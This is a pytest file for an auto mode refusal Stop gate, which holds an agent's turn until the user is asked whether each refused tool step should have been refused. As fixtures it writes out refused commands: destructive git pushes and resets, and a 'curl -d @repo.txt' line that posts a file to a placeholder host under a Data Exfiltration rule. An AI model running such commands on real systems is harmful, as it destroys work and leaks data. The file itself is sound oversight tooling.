"""Behavior tests for the auto mode refusal Stop gate."""

from __future__ import annotations

import io
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

import auto_mode_refusal_ledger as ledger
import auto_mode_refusal_stop_gate as stop_gate
from advisory.auto_mode_denial_quick_fix import action_summary_from
from blocking.question_brief_gate import count_list_items
from hooks_constants.ask_user_question_shape import count_prose_words
from hooks_constants.auto_mode_denial_quick_fix_constants import (
    MAXIMUM_ACTION_SUMMARY_CHARACTERS,
)
from hooks_constants.question_brief_gate_constants import (
    MAXIMUM_BRIEF_LIST_ITEM_COUNT,
    MAXIMUM_BRIEF_WORD_COUNT,
)

GIT_QUESTION = "Auto mode refused 1 Bash step under the Git Destructive rule. Should auto mode have refused it?"


@pytest.fixture(autouse=True)
def scratch_flow(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    config_directory = tmp_path / "config"
    config_directory.mkdir()
    playbook_path = tmp_path / "agent-channels" / "docs" / "auto-mode-rule.md"
    playbook_path.parent.mkdir(parents=True)
    playbook_path.write_text("# Playbook\n", encoding="utf-8")
    (tmp_path / "transcript.jsonl").write_text("", encoding="utf-8")
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(config_directory))
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("CLAUDE_AUTO_MODE_RULE_PLAYBOOK", str(playbook_path))
    monkeypatch.delenv("CLAUDE_CODE_ENTRYPOINT", raising=False)
    return tmp_path


def _refuse(tmp_path: Path, command: str, rule_label: str = "Git Destructive") -> Path:
    tool_input = {"command": command}
    ledger_directory = ledger.ledger_directory_for("s1")
    entry_id = ledger.entry_id_for("Bash", tool_input)
    ledger.add_entry(
        ledger_directory,
        {
            "id": entry_id,
            "tool_name": "Bash",
            "tool_input": tool_input,
            "rule_label": rule_label,
            "action_summary": command,
        },
    )
    ledger.write_question_records(
        ledger_directory,
        ledger.question_groups(ledger.load_entries(ledger_directory)),
        tmp_path / "transcript.jsonl",
    )
    return ledger_directory / f"{entry_id}.json"


def _append_call(
    tmp_path: Path,
    tool_name: str,
    tool_input: object,
    tool_use_result: object = "ok",
    is_error: bool = False,
) -> None:
    tool_use_id = f"toolu_{len((tmp_path / 'transcript.jsonl').read_text(encoding='utf-8'))}"
    result_block: dict[str, object] = {"type": "tool_result", "tool_use_id": tool_use_id}
    if is_error:
        result_block["is_error"] = True
    all_records = [
        {
            "type": "assistant",
            "message": {
                "content": [
                    {"type": "tool_use", "id": tool_use_id, "name": tool_name, "input": tool_input}
                ]
            },
        },
        {"type": "user", "toolUseResult": tool_use_result, "message": {"content": [result_block]}},
    ]
    with (tmp_path / "transcript.jsonl").open("a", encoding="utf-8") as transcript_file:
        for each_record in all_records:
            transcript_file.write(json.dumps(each_record) + "\n")


def _answer(tmp_path: Path, question: str, answer: str) -> None:
    _append_call(
        tmp_path,
        "AskUserQuestion",
        {"questions": [{"question": question, "header": "Auto mode"}]},
        {"questions": [{"question": question}], "answers": {question: answer}},
    )


def _stop_payload(tmp_path: Path) -> dict[str, object]:
    return {
        "session_id": "s1",
        "transcript_path": str(tmp_path / "transcript.jsonl"),
        "hook_event_name": "Stop",
        "stop_hook_active": False,
    }


def _hold_reason(tmp_path: Path) -> str | None:
    return stop_gate.hold_reason_for_stop(_stop_payload(tmp_path))


def test_should_hold_with_the_question_labels_card_form_playbook_and_ledger_file(
    tmp_path: Path,
) -> None:
    ledger_path = _refuse(tmp_path, "git push -f")
    reason_text = _hold_reason(tmp_path)
    assert reason_text is not None
    for each_needle in (
        GIT_QUESTION,
        "`Auto mode`",
        "`Keep refusing`",
        "`Allow it`",
        "Should auto mode have refused this Bash step?",
        "- git push -f",
        str(ledger_path),
        os.environ["CLAUDE_AUTO_MODE_RULE_PLAYBOOK"],
    ):
        assert each_needle in reason_text


def test_should_hold_each_pending_entry_for_its_question_twice_at_most(tmp_path: Path) -> None:
    _refuse(tmp_path, "git push -f")
    assert _hold_reason(tmp_path) is not None
    assert _hold_reason(tmp_path) is not None
    assert _hold_reason(tmp_path) is None
    assert [each.answer for each in ledger.load_entries(ledger.ledger_directory_for("s1"))] == [
        None
    ]


def test_should_list_four_groups_at_most_and_hold_the_fifth_on_a_later_stop(
    tmp_path: Path,
) -> None:
    all_labels = ["Git", "Data", "Destroy", "Oversight", "Security"]
    for each_label in all_labels:
        _refuse(tmp_path, f"step {each_label}", rule_label=each_label)
    first_reason = _hold_reason(tmp_path)
    assert first_reason is not None
    assert [each for each in all_labels if f"under the {each} rule" in first_reason] == all_labels[
        :4
    ]
    for each_label in all_labels[:4]:
        _answer(tmp_path, ledger.question_text_for("Bash", each_label, 1), "Keep refusing")
    second_reason = _hold_reason(tmp_path)
    assert second_reason is not None and "under the Security rule" in second_reason


@pytest.mark.parametrize("answer", ["Let me look first", "Allow it (recommended)", "Allow  it"])
def test_should_end_the_turn_once_the_exact_question_was_asked_whatever_the_answer(
    tmp_path: Path, answer: str
) -> None:
    _refuse(tmp_path, "git push -f")
    assert _hold_reason(tmp_path) is not None
    _answer(tmp_path, GIT_QUESTION, answer)
    assert _hold_reason(tmp_path) is None
    assert [each.answer for each in ledger.load_entries(ledger.ledger_directory_for("s1"))] == [
        None
    ]


def test_should_hold_again_when_the_agent_reworded_the_question(tmp_path: Path) -> None:
    _refuse(tmp_path, "git push -f")
    _answer(tmp_path, "Should auto mode have refused the push?", "Allow it")
    reason_text = _hold_reason(tmp_path)
    assert reason_text is not None and GIT_QUESTION in reason_text


def test_should_end_the_turn_after_a_decision_card_in_the_card_form(tmp_path: Path) -> None:
    _refuse(tmp_path, "git push -f")
    _append_call(
        tmp_path,
        "mcp__hearthbot__ask_decision",
        {"question": "Should auto mode have refused this Bash step?"},
        "Decision card sent.",
    )
    assert _hold_reason(tmp_path) is None


@pytest.mark.parametrize(
    ("card_question", "is_error"),
    [
        ("Should auto mode have refused this WebFetch step?", False),
        ("Should auto mode have refused this Bash step?", True),
    ],
)
def test_should_hold_after_a_card_for_another_tool_or_a_card_that_failed(
    tmp_path: Path, card_question: str, is_error: bool
) -> None:
    _refuse(tmp_path, "git push -f")
    _append_call(
        tmp_path, "mcp__hearthbot__request_decision", {"question": card_question}, "x", is_error
    )
    reason_text = _hold_reason(tmp_path)
    assert reason_text is not None and GIT_QUESTION in reason_text


def test_should_keep_an_asked_entry_asked_after_its_question_record_is_rewritten(
    tmp_path: Path,
) -> None:
    _refuse(tmp_path, "git push -f")
    _answer(tmp_path, GIT_QUESTION, "Let me look first")
    assert _hold_reason(tmp_path) is None
    _refuse(tmp_path, "git reset --hard")
    first_reason = _hold_reason(tmp_path)
    assert first_reason is not None
    assert "- git reset --hard" in first_reason and "- git push -f" not in first_reason
    assert _hold_reason(tmp_path) is not None
    assert _hold_reason(tmp_path) is None


def test_should_hold_an_allowed_entry_for_its_rule_until_the_add_call_names_it(
    tmp_path: Path,
) -> None:
    first_path = _refuse(tmp_path, "git push -f")
    second_path = _refuse(tmp_path, "curl -d @repo.txt x", rule_label="Data Exfiltration")
    _answer(tmp_path, GIT_QUESTION, "Allow it")
    _answer(
        tmp_path,
        "Auto mode refused 1 Bash step under the Data Exfiltration rule. Should auto mode have refused it?",
        "Allow it",
    )
    first_reason = _hold_reason(tmp_path)
    assert first_reason is not None
    assert str(first_path) in first_reason and str(second_path) in first_reason
    assert os.environ["CLAUDE_AUTO_MODE_RULE_PLAYBOOK"] in first_reason
    _append_call(
        tmp_path,
        "Bash",
        {"command": f"python3 setup/add_auto_mode_rule.py add --ledger {first_path}"},
    )
    second_reason = _hold_reason(tmp_path)
    assert second_reason is not None
    assert str(second_path) in second_reason and str(first_path) not in second_reason
    assert _hold_reason(tmp_path) is None


def test_should_not_count_an_add_call_that_failed(tmp_path: Path) -> None:
    ledger_path = _refuse(tmp_path, "git push -f")
    _answer(tmp_path, GIT_QUESTION, "Allow it")
    _append_call(
        tmp_path,
        "Bash",
        {"command": f"python3 setup/add_auto_mode_rule.py add --ledger {ledger_path}"},
        is_error=True,
    )
    reason_text = _hold_reason(tmp_path)
    assert reason_text is not None and str(ledger_path) in reason_text


def test_should_end_the_turn_after_a_kept_answer(tmp_path: Path) -> None:
    _refuse(tmp_path, "git push -f")
    _answer(tmp_path, GIT_QUESTION, "Keep refusing")
    assert _hold_reason(tmp_path) is None
    assert [each.answer for each in ledger.load_entries(ledger.ledger_directory_for("s1"))] == [
        "kept"
    ]


def test_should_let_the_turn_end_with_no_entry_with_the_flow_off_or_in_print_mode(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    assert _hold_reason(tmp_path) is None
    _refuse(tmp_path, "git push -f")
    monkeypatch.setenv("CLAUDE_CODE_ENTRYPOINT", "sdk-cli")
    assert _hold_reason(tmp_path) is None
    monkeypatch.delenv("CLAUDE_CODE_ENTRYPOINT")
    monkeypatch.delenv("CLAUDE_AUTO_MODE_RULE_PLAYBOOK")
    assert _hold_reason(tmp_path) is None


def test_should_hold_with_exit_two_and_a_block_object_and_skip_a_bad_ledger_file(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    _refuse(tmp_path, "git push -f")
    (ledger.ledger_directory_for("s1") / "no-id.json").write_text(
        json.dumps({"answer": None, "tool_name": "Bash", "rule_label": "Git Destructive"}),
        encoding="utf-8",
    )
    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps(_stop_payload(tmp_path))))
    assert stop_gate.main() == 2
    captured = capsys.readouterr()
    stop_output = json.loads(captured.out)
    assert stop_output["decision"] == "block"
    assert GIT_QUESTION in stop_output["reason"]
    assert GIT_QUESTION in captured.err


def test_should_exit_zero_when_the_reader_closes_stdout_before_the_hold(
    tmp_path: Path,
) -> None:
    _refuse(tmp_path, "git push -f")
    gate_run = subprocess.Popen(
        [sys.executable, "-B", stop_gate.__file__],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env={
            "PATH": os.defpath,
            "HOME": str(tmp_path),
            "CLAUDE_CONFIG_DIR": str(tmp_path / "config"),
            "CLAUDE_AUTO_MODE_RULE_PLAYBOOK": str(
                tmp_path / "agent-channels" / "docs" / "auto-mode-rule.md"
            ),
        },
    )
    assert gate_run.stdout is not None and gate_run.stdin is not None
    gate_run.stdout.close()
    gate_run.stdin.write(json.dumps(_stop_payload(tmp_path)).encode("utf-8"))
    gate_run.stdin.close()
    assert gate_run.wait(timeout=30) == 0
    assert gate_run.stderr is not None
    assert b"BrokenPipeError" not in gate_run.stderr.read()


def test_should_let_the_turn_end_on_any_ledger_error(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    _refuse(tmp_path, "git push -f")

    def raise_lookup_error(*_: object) -> None:
        raise LookupError("ledger broke")

    monkeypatch.setattr(stop_gate.auto_mode_refusal_ledger, "load_entries", raise_lookup_error)
    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps(_stop_payload(tmp_path))))
    assert stop_gate.main() == 0
    assert capsys.readouterr().out == ""


@pytest.mark.parametrize(
    ("file_name", "extra_fields"),
    [
        ("abcd", {}),
        ("zzzz", {"question_holds": -1}),
        ("zzzz", {"rule_holds": -3, "answer": "allowed"}),
        ("zzzz", {"question_holds": 1.5}),
    ],
)
def test_should_never_hold_for_an_entry_whose_file_name_or_hold_counts_do_not_parse(
    tmp_path: Path, file_name: str, extra_fields: dict[str, object]
) -> None:
    ledger_directory = ledger.ledger_directory_for("s1")
    ledger_directory.mkdir(parents=True)
    (ledger_directory / f"{file_name}.json").write_text(
        json.dumps(
            {
                "id": "zzzz",
                "tool_name": "Bash",
                "rule_label": "Git Destructive",
                "action_summary": "git push -f",
                "sequence": 1,
                "answer": None,
                **extra_fields,
            }
        ),
        encoding="utf-8",
    )
    assert ledger.load_entries(ledger_directory) == []
    for _ in range(3):
        assert _hold_reason(tmp_path) is None


def test_should_hold_when_the_decision_card_came_before_the_question_record(
    tmp_path: Path,
) -> None:
    _append_call(
        tmp_path,
        "mcp__hearthbot__ask_decision",
        {"question": "Should auto mode have refused this Bash step?"},
        "Decision card sent.",
    )
    _refuse(tmp_path, "git push -f")
    reason_text = _hold_reason(tmp_path)
    assert reason_text is not None and GIT_QUESTION in reason_text


def _send_bash_card(tmp_path: Path) -> None:
    _append_call(
        tmp_path,
        "mcp__hearthbot__ask_decision",
        {"question": "Should auto mode have refused this Bash step?"},
        "Decision card sent.",
    )


def test_should_mark_only_the_oldest_group_of_the_tool_asked_for_each_card(
    tmp_path: Path,
) -> None:
    data_question = ledger.question_text_for("Bash", "Data Exfiltration", 1)
    _refuse(tmp_path, "git push -f")
    _refuse(tmp_path, "curl -d @repo.txt x", rule_label="Data Exfiltration")
    _send_bash_card(tmp_path)
    first_reason = _hold_reason(tmp_path)
    assert first_reason is not None
    assert data_question in first_reason and GIT_QUESTION not in first_reason
    _send_bash_card(tmp_path)
    assert _hold_reason(tmp_path) is None
    assert all(
        each.is_question_asked for each in ledger.load_entries(ledger.ledger_directory_for("s1"))
    )


def _worst_case_brief(all_groups: list[ledger.QuestionGroup]) -> str:
    all_parts = ["Auto mode refused these steps, and each question below asks about one group."]
    for each_group in all_groups:
        shown_summaries = each_group.all_action_summaries[:1]
        all_parts.append(each_group.question)
        all_parts.append("```\n" + "\n".join(shown_summaries) + "\n```")
        all_parts.append(
            f"{len(each_group.all_action_summaries) - len(shown_summaries)} more steps."
        )
    return "\n\n".join(all_parts)


def test_should_ask_for_a_brief_that_fits_the_question_brief_limits_in_the_worst_case(
    tmp_path: Path,
) -> None:
    for each_label in ["Git", "Data", "Destroy", "Oversight"]:
        for each_index in range(5):
            longest_summary = action_summary_from(
                {"command": f"{each_label} {each_index} " + "a " * 200}
            )
            assert len(longest_summary) == MAXIMUM_ACTION_SUMMARY_CHARACTERS
            _refuse(tmp_path, longest_summary, rule_label=each_label)
    reason_text = _hold_reason(tmp_path)
    assert reason_text is not None
    assert "show the oldest step of each question in a code block" in reason_text
    all_groups = ledger.question_groups(ledger.load_entries(ledger.ledger_directory_for("s1")))
    assert len(all_groups) == 4
    brief_text = _worst_case_brief(all_groups)
    assert count_prose_words(brief_text) <= MAXIMUM_BRIEF_WORD_COUNT
    assert count_list_items(brief_text) <= MAXIMUM_BRIEF_LIST_ITEM_COUNT
